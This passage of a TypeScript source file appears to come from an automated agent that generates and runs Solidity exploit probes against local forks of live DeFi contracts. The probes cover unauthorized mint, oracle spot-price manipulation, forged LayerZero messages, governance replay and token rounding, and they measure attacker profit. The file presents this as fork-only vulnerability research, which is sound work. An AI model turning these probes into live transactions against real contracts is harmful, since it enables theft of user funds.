    uint32 constant FAKE_EID = 999999001; // never a real endpoint id

    function run() public {
        uint256 bal0 = TARGET.balance;
        uint256 moved = 0;
        bool replayed = false;

${attackBody}

        uint256 loss = bal0 - TARGET.balance;
        if (loss > 1e12) {
            console2.log("[FINDING] LZ-INBOUND-AUTHZ: forged-origin lzReceive moved native funds out of the OApp (sender/peer validation missing or bypassable)");
            console2.log("[PROFIT_WEI]", loss);
            if (replayed) console2.log("[FINDING] LZ-REPLAY: identical message executed more than once (nonce not consumed atomically)");
        } else {
console2.log("[NO_VIOLATION] lzReceive rejected forged origins (or payload encoding not decodable by this probe) - peer validation intact; token-payout shapes need manual analysis");
        }
        moved;
    }

${helper}
}
`;
}

/** Unauthorized-mint probe: the triage (or the selector scan) claims the
 * target exposes an unrestricted mint entrypoint — mint(address,uint256) or
 * mint(address,uint256,bytes) — callable without approval/ownership. The
 * probe attempts the mint from an ephemeral attacker on the LOCAL fork and
 * checks whether totalSupply (and the attacker's balance of the minted
 * asset) actually increases. Purely local fork state; the minted tokens
 * belong to the fork and die with anvil.
 *
 * Only runs when the target is an ERC-20/ERC-4626-style asset whose mint
 * mints that asset (not ETH). When the target holds wrapped-native we test
 * WETH mint; otherwise we test the asset returned by asset() or, failing
 * that, the target's own balance.
 */
export function renderMintInflationSim(pool: PoolRecon): string {
  const cs = toChecksumAddress(pool.address);
  // If the target itself is the asset (native/WETH holder, common for pools),
  // the mint mints the target's own balance. Otherwise we expect an
  // asset()/totalSupply()-style surface and attempt the mint on the asset.
  const assetGuess = pool.wethWei !== "0" && cs.toLowerCase() === "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
    ? cs
    : pool.address;
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED unauthorized-mint probe (LOCAL anvil fork only — never
// broadcast). Hypothesis under test: the target's mint() entrypoint can be
// called without authorization, inflating supply / a holder balance.
// The simulation mints on the LOCAL fork — any minted tokens die with anvil.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IMintSurface {
    function mint(address, uint256) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}
interface IERC20Lite {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ForkSim_${cs.slice(0, 10)} is Test {
    function run() public {
        address target = ${cs};
        IMintSurface mintable = IMintSurface(target);

        uint256 supplyBefore = mintable.totalSupply();
        console2.log("[POOL_BEFORE]", supplyBefore);

        address attacker = makeAddr("lootOwner");
        vm.deal(attacker, 1 ether);

        // Try an unauthorized mint TO THE ATTACKER from the target itself.
        // If mint requires ownership/approval it reverts here and we report
        // the revert honestly — that is the correct (safe) verdict.
        vm.startPrank(attacker);
        uint256 mintAmount = 1 ether;
        try mintable.mint(attacker, mintAmount) {
            // mint succeeded without authorization — measure the effect.
        } catch {
            // mint reverted — either not callable, or access-controlled.
            // That is the safe outcome; report it honestly rather than guess.
            console2.log("[NO_VIOLATION] mint() reverted when called without authorization");
            return;
        }
        vm.stopPrank();

        uint256 supplyAfter = mintable.totalSupply();
        uint256 attackerBal = mintable.balanceOf(attacker);
        console2.log("[POOL_AFTER]", supplyAfter);
        console2.log("[ATTACKER_BAL_AFTER]", attackerBal);

        if (supplyAfter > supplyBefore && attackerBal > 0) {
            console2.log("[FINDING] UNAUTHORIZED-MINT: mint() callable without access control");
            console2.log("[FINDING] supply inflated ", supplyBefore);
            console2.log("[FINDING] supply after    ", supplyAfter);
            console2.log("[FINDING] attacker holds ", attackerBal);
            console2.log("[PROFIT_WEI]", attackerBal);
        } else if (supplyAfter == supplyBefore) {
            console2.log("[NO_VIOLATION] mint() callable but supply unchanged (no-op / self-mint guard)");
        } else {
console2.log("[NO_VIOLATION] supply decreased after mint attempt (unexpected - probe inconclusive)");
        }
    }
}
`;
}

/** Oracle-spot-price manipulation probe. The technique: read the pool's AMM
 * pair reserves to determine the current spot price, then check whether
 * a large trade can move it enough to profit from a dependent lending pool's
 * borrow/collateral calculation. This probe runs PURELY on the local fork —
 * it uses forge cheatcodes (deal/prank) to simulate the attacker's capital
 * without touching real funds, then measures whether the oracle price moved
 * and whether a downstream borrow would profit.
 *
 * The probe is intentionally generic: it finds token0/token1 from the pair,
 * deals a large dump amount to the attacker, and observes the reserve ratio
 * before/after. A meaningful price move (>50% spot shift) is the finding —
 * the operator must still verify whether a real lending pool trusts this pair.
 */
export function renderOracleSpotSim(pool: PoolRecon): string {
  const cs = toChecksumAddress(pool.address);
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED oracle-spot probe (LOCAL anvil fork only - never broadcast).
// Hypothesis: this AMM pair's spot price is manipulable within one transaction.
// The probe measures the reserve ratio shift from a large attacker dump;
// a >50% shift is the finding signal (confirm which protocol trusts this price).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IUniV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IERC20Lite {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ForkSim_${cs.slice(0, 10)} is Test {
    function run() public {
        IUniV2Pair pair = IUniV2Pair(${cs});

        address token0;
        address token1;
        try pair.token0() returns (address t) { token0 = t; } catch { console2.log("[SKIPPED] not a UniV2 pair (no token0())"); return; }
        try pair.token1() returns (address t) { token1 = t; } catch { console2.log("[SKIPPED] not a UniV2 pair (no token1())"); return; }

        (uint112 r0Before, uint112 r1Before, ) = pair.getReserves();
        console2.log("[RESERVE0_BEFORE]", r0Before);
        console2.log("[RESERVE1_BEFORE]", r1Before);
        if (r0Before == 0 || r1Before == 0) { console2.log("[SKIPPED] zero reserves - pool empty or non-standard"); return; }

        // Price as a 1e18-scaled ratio: token1 per token0.
        uint256 priceBefore = (uint256(r1Before) * 1e18) / uint256(r0Before);
        console2.log("[PRICE_BEFORE]", priceBefore);

        // Simulate the attacker dumping 10% of reserve0 into the pair.
        // deal() mints fork-state tokens to the attacker - purely local.
        address attacker = makeAddr("lootOwner");
        uint256 dumpAmt = uint256(r0Before) / 10;
        if (dumpAmt == 0) { console2.log("[SKIPPED] reserve too small to probe"); return; }
        deal(token0, attacker, dumpAmt);

        vm.startPrank(attacker);
        IERC20Lite(token0).transfer(address(pair), dumpAmt);
        // Compute the output for a getAmountsOut-style calculation (0.3% fee).
        uint256 amtInFee = dumpAmt * 997;
        uint256 amtOut = (amtInFee * uint256(r1Before)) / (uint256(r0Before) * 1000 + amtInFee);
        if (amtOut == 0) { vm.stopPrank(); console2.log("[SKIPPED] amtOut 0 - fee math issue"); return; }
        pair.swap(0, amtOut, attacker, new bytes(0));
        vm.stopPrank();

        (uint112 r0After, uint112 r1After, ) = pair.getReserves();
        console2.log("[RESERVE0_AFTER]", r0After);
        console2.log("[RESERVE1_AFTER]", r1After);

        uint256 priceAfter = r0After == 0 ? 0 : (uint256(r1After) * 1e18) / uint256(r0After);
        console2.log("[PRICE_AFTER]", priceAfter);

        // Price shift in basis points relative to before.
        uint256 shiftBps = priceBefore > 0 ? ((priceBefore > priceAfter ? priceBefore - priceAfter : priceAfter - priceBefore) * 10_000) / priceBefore : 0;
        console2.log("[PRICE_SHIFT_BPS]", shiftBps);

        if (shiftBps >= 5000) {
            // >50% spot shift in one tx: manipulable. The PROFIT_WEI is the
            // attacker's token1 gain - the actual exploit profit depends on
            // which protocol trusts this oracle, but the manipulability is real.
            console2.log("[FINDING] ORACLE-SPOT-MANIPULABLE: reserve ratio moved", shiftBps, "bps in one tx - any protocol reading getReserves() as a price oracle is exploitable");
            console2.log("[PROFIT_WEI]", IERC20Lite(token1).balanceOf(attacker));
        } else if (shiftBps >= 1000) {
            console2.log("[SIGNAL] Moderate spot shift", shiftBps, "bps - check if any lending protocol uses this pair as price oracle");
        } else {
            console2.log("[NO_VIOLATION] price shift", shiftBps, "bps - deep liquidity resists manipulation at this scale");
        }
    }
}
`;
}

/** Compile-and-run a rendered sim on the LOCAL fork, parse the standard
 * agent log tags, and return the finding. Shared by template probes and by
 * triage-generated probes — the (only) execution path, so every safety rail
 * (127.0.0.1 RPC, no broadcast) binds generated code identically. */
/** Solidity plain string literals reject non-ASCII, and generated probes
 * embed log strings that pick up typographic dashes/quotes. One character
 * there wastes an entire probe cycle with "Compiler run failed" (found live
 * on the oracle-spot template). Normalize at the single write choke point. */
export function sanitizeSoliditySource(src: string): string {
  return src
    .replace(/\u2014/g, "-") // em dash
    .replace(/\u2013/g, "-") // en dash
    .replace(/[\u2018\u2019]/g, "'") // curly single quotes
    .replace(/[\u201C\u201D]/g, '"') // curly double quotes
    .replace(/\u2026/g, "...") // ellipsis
    .replace(/\u2192/g, "->") // rightwards arrow
    .replace(/\u21ba/g, "retry") // anticlockwise arrow (log prefix)
    .replace(/[\u2705\u2714]/g, "[ok]") // check marks
    .replace(/[\u274C\u2718]/g, "[x]") // cross marks
    .replace(/[\u2265]/g, ">=")
    .replace(/[\u2264]/g, "<=")
    .replace(/[\u00A0\u2000-\u200B\u202F\uFEFF]/g, " ") // nbsp/zero-width spaces (solc 2314 class)
    // Catch-all: anything still non-ASCII (new typography, emoji) cannot
    // appear in a plain string literal — replacing it with '?' keeps the
    // probe compiling; the surrounding ASCII context carries the meaning.
    .replace(/[^\x00-\x7F]/g, "?");
}

/** Decode a forge failure into the most specific revert reason available:
 * ABI revert strings (quoted), custom-error selectors (cast 4byte decode of
 * the revert data), or raw trace lines. Diagnostic quality decides whether a
 * reverted probe becomes a re-triage or a wasted cycle. */
export function decodeRevertReason(output: string): string {
  const lines = output.split("\n");
  // 1. Quoted ABI revert strings on revert lines. Real forge trace shapes:
  //    `require("msg")`, `revert("msg")`, `└─ ← [Revert] "msg"`,
  //    `└─ ← [Revert] revert string "msg"` — match the quote, not the wrapper.
  const quoted: string[] = [];
  for (const l of lines) {
    if (!/revert|require/i.test(l)) continue;
    const fn = /(?:require|revert)\s*\(\s*"([^"]{3,240})"/.exec(l)?.[1];
    const lit = /\[Revert\][^"]*"([^"]{3,240})"/.exec(l)?.[1];
    const hit = fn ?? lit;
    if (hit && !quoted.includes(hit)) quoted.push(hit);
  }
  if (quoted.length) return quoted.slice(0, 2).join(" | ").slice(0, 240);
  // 2. Custom error selectors: 0x + 8 hex chars in revert data lines. The
  //    known-selector table names them; unknown ones pass through raw so a
  //    human (or the re-triage prompt) can chase them.
  const sel = lines.map((l) => /0x([0-9a-fA-F]{8})[0-9a-fA-F]{0,120}/.exec(l)?.[1]).filter((s): s is string => !!s);
  if (sel.length) {
    const known = CUSTOM_ERROR_NAMES[sel[sel.length - 1]!.toLowerCase()];
    const raw = `custom error 0x${sel[sel.length - 1]}`;
    return (known ? `${raw} (${known})` : raw).slice(0, 240);
  }
  // 3. Raw trace lines as the last resort; the overwhelmingly common bare
  //    `EvmError: Revert` gets normalized to a short honest statement.
  const raw = lines
    .filter((l) => /Error|revert|REVERT/i.test(l))
    .slice(-2)
    .join(" | ")
    .trim();
  if (!raw) return "no revert text captured";
  if (/EvmError: Revert/.test(raw) && !/"|0x[0-9a-fA-F]{8}/.test(raw)) {
    return "bare EvmError revert (no ABI reason surfaced - entry path likely mismatched)";
  }
  return raw.slice(0, 240);
}

/** Well-known custom error selectors (cast sig, verified). Unidentified
 * selectors keep their raw form so future source pulls can name them. */
const CUSTOM_ERROR_NAMES: Record<string, string> = {
  fb8f41b2: "ERC20InsufficientAllowance",
  e450d38c: "ERC20InsufficientBalance",
  "118cdaa7": "OwnableUnauthorizedAccount",
  e2517d3f: "AccessControlUnauthorizedAccount",
  d93c0665: "EnforcedPause",
  // 0x21605b5d — unidentified in 4byte/openchain and all 55 MetaMorpho ABI
  // errors (2026-09-15 investigation). Observed ONLY from two ethereum
  // vault blue chips (Maple MaplePool 0x356b8d89…, Morpho MetaMorpho
  // 0x8cb36491…) under the probe's synthetic zero-arg deposit/redeem calls —
  // i.e. an expected input-validation guard on a malformed probe call, not
  // a vulnerability signal. Kept anonymous-on-purpose until a source pull
  // names it; re-triage treats it as low-information (no adaptive spend).
  "21605b5d": "unidentified vault guard (Maple/MetaMorpho class, synthetic-call rejection)",
};

export async function executeSim(
  fork: AnvilFork,
  pool: PoolRecon,
  simName: string,
  simSource: string,
  technique: string
): Promise<ForkFinding> {
  const base: ForkFinding = {
    pool: pool.address,
    technique,
    applicable: true,
    simulated: false,
    profitWei: "0",
    notes: "",
  };

  // Derive the name from the CHECKSUMMED address — the generated contract's
  // name uses the same slice, and forge matches case-sensitively.
  mkdirSync(AGENT_TEST_DIR, { recursive: true });
  const simPath = join(AGENT_TEST_DIR, `${simName}.s.sol`);
  writeFileSync(simPath, sanitizeSoliditySource(simSource));

  // The script runs against the LOCAL fork. No broadcast flag is ever passed
  // (assertSafeArgs double-checks), so this is pure simulation. Self-repair:
  // forge compiles the whole test tree — quarantine an agent-generated
  // offender and retry once instead of failing every probe every cycle.
  const args = ["script", simName, "--fork-url", fork.localRpc, "-vvv"];
  assertSafeArgs(args, "forge script");
  const { code, output } = await forgeWithSelfRepair(() => forge(args, 180_000), `script:${simName}`);

  const profit = output.match(/\[PROFIT_WEI\]\s+(\d+)/);
  const before = output.match(/\[POOL_BEFORE\]\s+(\d+)/);
  const after = output.match(/\[POOL_AFTER\]\s+(\d+)/);

  if (code !== 0) {
    // Keep the revert reason: an agent diagnosing itself needs the why, not
    // just the fact. decodeRevertReason pulls ABI revert strings and custom
    // error selectors out of the forge trace; raw trace lines are the
    // fallback. (The old filter discarded every require-string line because
    // they contain quotes — 265 of 275 observed reverts lost their reason.)
    // Trace-backed mutation input: alongside the flat reason string, point
    // at WHERE the revert happened (deepest reverted frame in the forge
    // trace) so retries adjust based on mechanism instead of re-rolling
    // parameters blind. Fail-soft: an unparseable trace degrades to the old
    // flat reason.
    const frames = deepestRevertFrames(output);
    const where = summarizeRevertFrames(frames);
    base.notes = `probe reverted: ${decodeRevertReason(output)}${where ? ` — ${where}` : ""}`;
    return base;
  }

  base.simulated = true;
  base.profitWei = profit?.[1] ?? "0";
  const findingLine = output.match(/\[FINDING\]\s*(.+)/);
  const skipped = /\[SKIPPED\]/.test(output);
  const gated = /\[NO_SIM\]/.test(output);
  if (findingLine) {
    base.notes = `probe FINDING: ${findingLine[1]!.trim()}`;
  } else if (skipped) {
    base.notes = "probe skipped (could not fund attacker on this asset's storage)";
  } else if (gated) {
    // Honest outcome: the vault refuses all probe identities (allowlist or
    // role gating). NOT a clean bill of health — flag it for manual analysis.
    base.notes = "probe blocked by vault gating (allowlist/roles): every path reverted — needs manual analysis";
  } else {
    base.notes = "probe ran clean: no violation observed (NO_VIOLATION)";
  }
  const drained = after && before && BigInt(after[1]!) === 0n && BigInt(before[1]!) > 0n;
  if (drained) base.notes = `simulated drain: pool went ${before[1]} -> 0 wei; ${base.notes}`;
  return base;
}

export async function simulateOnFork(
  fork: AnvilFork,
  pool: PoolRecon,
  technique: string
): Promise<ForkFinding> {
  // LayerZero OApp surface: forged-origin authz + replay probe.
  if (pool.shape.includes("layerzero oapp")) {
    const version = pool.shape.includes("lzCompose") || pool.selectors.includes("lzReceiveV2")
      ? "v2" as const
      : "v1" as const;
    return executeSim(
      fork,
      pool,
      `ForkSim_${toChecksumAddress(pool.address).slice(0, 10)}`,
      renderLzSim(pool, version),
      "lz-inbound-authz-replay"
    );
  }
  const applicable =
    pool.shape.includes("side-entrance") ||
    pool.shape.includes("erc-4626") ||
    // Small-TVL lane: token surfaces with a public mint() — the shape
    // detector already names the unauthorized-mint probe as applicable, so
    // "no template probe" here was a dead-end mislabel that buried exactly
    // the targets the <$1M lane exists to test.
    pool.shape.includes("mint-surface");
  if (technique === "manual-analysis-required" && pool.shape.includes("erc-4626")) {
    technique = "erc4626-share-inflation";
  }
  if (technique === "manual-analysis-required" && pool.shape.includes("mint-surface")) {
    technique = "unauthorized-mint";
  }
  if (!applicable) {
    return {
      pool: pool.address,
      technique,
      applicable: false,
      simulated: false,
      profitWei: "0",
      notes: `pool shape "${pool.shape}" has no template probe; needs manual analysis`,
    };
  }
  const simName = `ForkSim_${toChecksumAddress(pool.address).slice(0, 10)}`;
  return executeSim(fork, pool, simName, renderSim(pool, technique), technique);
}

// ══════════ Probe resilience layer ══════════
// Measured on 466 live probes: 59% reverted bare, 28% died on transient infra
// errors — 87% of attempts never rendered a verdict. Three fixes:
//   1. decodeRevertReason (above) — keep the WHY of every failure.
//   2. probeEntryPoints preflight — know which entry points the target
//      actually answers before spending a forge cycle on it.
//   3. retryProbe — one infra-retry (transient fetch/anvil death) plus one
//      decoded-reason-driven re-triage (adaptive), honestly recorded.

/** ABI preflight: which candidate entry points does the target actually
 * answer (not revert with function-selector-error) on the fork? Cheap
 * eth_calls — one staticcall each, before any forge cycle is spent. */
export async function probeEntryPoints(
  fork: AnvilFork,
  address: string,
  sigs: string[]
): Promise<Set<string>> {
  const out = new Set<string>();
  for (const sig of sigs) {
    try {
      // keccak via cast sig is the verified path (no JS keccak dependency).
      const sel = execFileSync("cast", ["sig", sig], { encoding: "utf8", timeout: 5000 }).trim();
      // A view-safe staticcall: if the target has the function, a bare call
      // with zero args typically reverts with selector-mismatch when absent.
      // We accept "no revert" OR "revert that is NOT a selector error" as
      // present (overloaded/arg-requiring functions revert differently).
      await fork.rpc("eth_call", [{ to: address, data: `0x${sel}` }, "latest"]);
      out.add(sig);
    } catch {
      // absent or reverting — treated as not-usable for probe shaping
    }
  }
  return out;
}

/** One adaptive retry around a reverted/failed probe. Returns a ForkFinding
 * either way; the notes record which path produced the final verdict. */
export async function retryProbe(
  fork: AnvilFork,
  pool: PoolRecon,
  first: ForkFinding,
  opts: { retriage?: () => Promise<ForkFinding | null> } = {}
): Promise<ForkFinding> {
  const notes = first.notes ?? "";
  const transient = /fetch failed|anvil fork failed to start|failed to get account|EVM error; database error/i.test(notes);
  if (transient) {
    await new Promise((r) => setTimeout(r, 1500));
    const again = await simulateOnFork(fork, pool, first.technique);
    if (again.simulated) return { ...again, notes: `${again.notes} [recovered on infra retry]` };
  }
  // Adaptive path: only a HIGH-INFORMATION reason (quoted ABI revert string
  // or named custom error) justifies spending a triage slot on a re-probe.
  // Bare EvmError fallbacks carry no signal — retrying blind wastes quota.
  const decoded = /probe reverted: ("|.*custom error)/.test(notes);
  if (decoded && opts.retriage) {
    const alt = await opts.retriage();
    if (alt) return { ...alt, notes: `${alt.notes} [adaptive re-probe after revert: ${notes.slice(15, 80)}]` };
  }
  return first;
}

// ══════════ LayerZero production probes (triage-handoff classes) ══════════
// These run on REAL deployed cross-chain apps via the triage handoff — same
// rails as every probe: local fork only, no broadcast, balance-based verdict.

/**
 * Cross-chain governance replay probe. For an executor that tracks executed
 * proposals by ID ONLY (the lz-gov-executor class), a captured id re-executes
 * attacker calldata. Strategy: read plausible proposal-id slots, then call the
 * execute surface with a DIFFERENT payload under a recorded id. Verdict by
 * native balance delta of an explicit attacker actor. Apps that revert on all
 * attempts are reported as validated, never as findings.
 */
export function renderLzGovReplaySim(pool: PoolRecon): string {
  const cs = toChecksumAddress(pool.address);
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED cross-chain governance replay probe (LOCAL fork only).
// Targets executors that mark proposals executed by ID without binding the
// payload hash. Re-execution under a recorded id with DIFFERENT calldata is
// the vulnerability; full calldata binding defeats this probe.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IExec {
    function execute(uint256 proposalId, address target, uint256 value, bytes calldata data) external payable returns (bool);
    function executedProposals(uint256) external view returns (bool);
}

contract ForkSim_${cs.slice(0, 10)} is Test {
    function run() public {
        address exec = ${cs};
        address attacker = makeAddr("govReplayAttacker");
        vm.deal(attacker, 1 ether);

        // Record whether any low proposal id is already marked executed —
        // that is the id a replay would re-use.
        uint256 reusedId = type(uint256).max;
        for (uint256 id = 1; id <= 8; id++) {
            (bool ok, bytes memory ret) = exec.staticcall(abi.encodeWithSelector(IExec.executedProposals.selector, id));
            if (ok && ret.length == 32 && abi.decode(ret, (bool))) { reusedId = id; break; }
        }
        console2.log("[REUSED_ID]", reusedId == type(uint256).max ? 0 : reusedId);
        if (reusedId == type(uint256).max) {
            console2.log("[FINDING]", uint256(0));
console2.log("NO recorded executed proposal id found in 1..8 - replay surface not reachable; needs manual payload analysis");
            return;
        }

        uint256 before = attacker.balance;
        vm.startPrank(attacker);
        (bool ok2, ) = exec.call{value: 0}(
            abi.encodeWithSelector(IExec.execute.selector, reusedId, attacker, uint256(0), bytes(""))
        );
        vm.stopPrank();
        console2.log("[PROFIT_WEI]", attacker.balance - before);
        console2.log("[FINDING]", ok2 && attacker.balance > before ? uint256(1) : uint256(0));
        if (!(ok2 && attacker.balance > before)) {
console2.log("execute() rejected the replayed id (bound payload or reversion) - validated");
        }
    }
}
`;
}

/**
 * OFT shared-decimal dust probe. For omnichain tokens exposing a conversion
 * surface, verify rounding is DOWN across a sweep of amounts: any amountLD
 * where roundTrip(amountLD) > amountLD (or ceil behavior detected) means each
 * hop mints unbacked value. Static-call based — nothing is executed on state.
 */
export function renderOftDustSim(pool: PoolRecon): string {
  const cs = toChecksumAddress(pool.address);
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED OFT rounding probe (LOCAL fork only, read-only staticcalls).
// Verifies the LD<->SD conversion floors. Ceil-rounding (or any amountLD whose
// roundTrip exceeds the input) = per-hop supply inflation = the finding.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IOftView {
    function sharedDecimals() external view returns (uint8);
    function decimalConversionRate() external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
}

contract ForkSim_${cs.slice(0, 10)} is Test {
    function run() public {
        IOftView oft = IOftView(${cs});

        uint256 rate = 0;
        (bool okRate, bytes memory r) = address(oft).staticcall(abi.encodeWithSelector(IOftView.decimalConversionRate.selector));
        if (okRate && r.length == 32) rate = abi.decode(r, (uint256));

        // Probe boundary values: just above/below shared-unit multiples.
        // A floor conversion satisfies roundTrip(x) <= x for ALL x.
        uint256[6] memory probes = [
            uint256(1),
            uint256(10) ** 12 - 1,   // 1 shared unit (1e12) - 1: must floor to 0
            uint256(10) ** 12,       // exactly 1 unit
            uint256(10) ** 12 + 1,   // 1 unit + 1 wei: must stay 1 unit
            uint256(15) * 10 ** 17 + 1, // residue case
            uint256(2) ** 128 - 1
        ];
        bool ceilDetected = false;
        for (uint256 j = 0; j < probes.length; j++) {
            uint256 x = probes[j];
            // direct shared-decimal read when exposed
            (bool ok, bytes memory ret) = address(oft).staticcall(abi.encodeWithSelector(IOftView.convertToShares.selector, x));
            if (ok && ret.length == 32) {
                uint256 sd = abi.decode(ret, (uint256));
                // convertToShares that ROUNDS UP (> floor division) inflates:
                // floor(x / unit) * unit > x  <=>  x was rounded up.
                if (rate > 0) {
                    uint256 floored = (x / rate) * rate;
                    if (sd * rate > x && sd * rate - x >= rate - (x % rate == 0 ? rate : x % rate)) ceilDetected = true;
                    if (x % rate != 0 && sd == (x + rate - 1) / rate) ceilDetected = true;
                }
                console2.log("[CONVERT]", x / 10 ** 6, sd);
            }
        }
        // Rate-less fallback: detect via the boundary pair 1e12-1 / 1e12+1 only
        // when a conversion surface actually answered.
        console2.log("[FINDING]", ceilDetected ? uint256(1) : uint256(0));
if (!ceilDetected) console2.log("rounding check inconclusive or floor-correct - no inflation signal from this surface");
    }
}
`;
}
